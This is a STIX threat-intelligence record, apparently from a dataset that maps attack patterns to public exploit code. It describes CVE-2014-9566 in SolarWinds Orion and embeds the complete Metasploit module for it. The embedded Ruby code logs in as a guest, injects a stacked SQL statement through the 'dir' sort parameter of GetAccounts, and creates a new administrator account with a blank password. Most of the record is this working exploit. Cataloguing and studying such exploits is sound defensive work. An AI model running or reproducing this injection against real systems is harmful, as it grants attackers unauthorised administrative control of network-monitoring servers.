{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8bd53376-7013-4f47-aa72-1a0c2c32d840",
    "created": "2024-08-14T16:32:12.619151Z",
    "modified": "2024-08-14T16:32:12.619156Z",
    "name": "Solarwinds Orion AccountManagement.asmx GetAccounts Admin Creation",
    "description": " This module exploits a stacked SQL injection in order to add an administrator user to the SolarWinds Orion database.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/solarwinds_orion_sqli.rb",
            "external_id": "solarwinds_orion_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9566"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solarwinds Orion AccountManagement.asmx GetAccounts Admin Creation',\n      'Description'    => %q{\n        This module exploits a stacked SQL injection in order to add an administrator user to the\n        SolarWinds Orion database.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Perry' #discovery/metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-9566']\n        ],\n      'DisclosureDate' => '2015-02-24'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8787),\n        OptString.new('TARGETURI', [ true, \"Base Orion directory path\", '/']),\n        OptString.new('USERNAME', [true, 'The username to authenticate as', 'Guest']),\n        OptString.new('PASSWORD', [false, 'The password to authenticate with', ''])\n      ])\n\n  end\n\n  def login (username,password)\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'Orion', 'Login.aspx')\n    })\n\n    viewstate = $1 if res.body =~ /id=\"__VIEWSTATE\" value=\"(.*)\" \\/>/\n\n    cookie = res.get_cookies\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'Orion', 'Login.aspx'),\n      'method' => 'POST',\n      'vars_post' => {\n        '__EVENTTARGET' => '',\n        '__EVENTARGUMENT' => '',\n        '__VIEWSTATE' => viewstate,\n        'ctl00$BodyContent$Username' => username,\n        'ctl00$BodyContent$Password' => password\n      },\n      'cookie' => cookie\n    })\n\n    if res.nil?\n      fail_with(Failure::UnexpectedReply, \"Server didn't respond in an expected way\")\n    end\n\n    if res.code == 200\n      fail_with(Failure::NoAccess, \"Authentication failed with username #{username}\")\n    end\n\n    return cookie + ';' + res.get_cookies\n  end\n\n  def run\n    cookie = login(datastore['USERNAME'], datastore['PASSWORD'])\n    username = Rex::Text.rand_text_alpha(8)\n\n    print_status(\"Logged in as #{datastore['USERNAME']}, sending payload to create #{username} admin user.\")\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'Orion', 'Services', 'AccountManagement.asmx' '/GetAccounts'),\n      'method' => 'POST',\n      'vars_get' => {\n        'sort' => 'Accounts.AccountID', #also vulnerable\n        'dir' => \"ASC;insert into accounts values ('#{username}', '127-510823478-74417-8', '/+PA4Zck3arkLA7iwWIugnAEoq4ocRsYjF7lzgQWvJc+pepPz2a5z/L1Pz3c366Y/CasJIa7enKFDPJCWNiKRg==', 'Feb  1 2100 12:00AM', 'Y', '#{username}', 1, '', '', 1, -1, 8, -1, 4, 0, 0, 0, 0, 0, 0, 'Y', 'Y', 'Y', 'Y', 'Y', '', '', 0, 0, 0, 'N', 'Y', '', 1, '', 0, '');\"\n      },\n      'data' => '{\"accountId\":\"\"}',\n      'cookie' => cookie,\n      'ctype' => 'application/json'\n    })\n\n    login(username, '')\n\n    print_good(\"The injection worked, log in with #{username} and a blank password\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-24"
}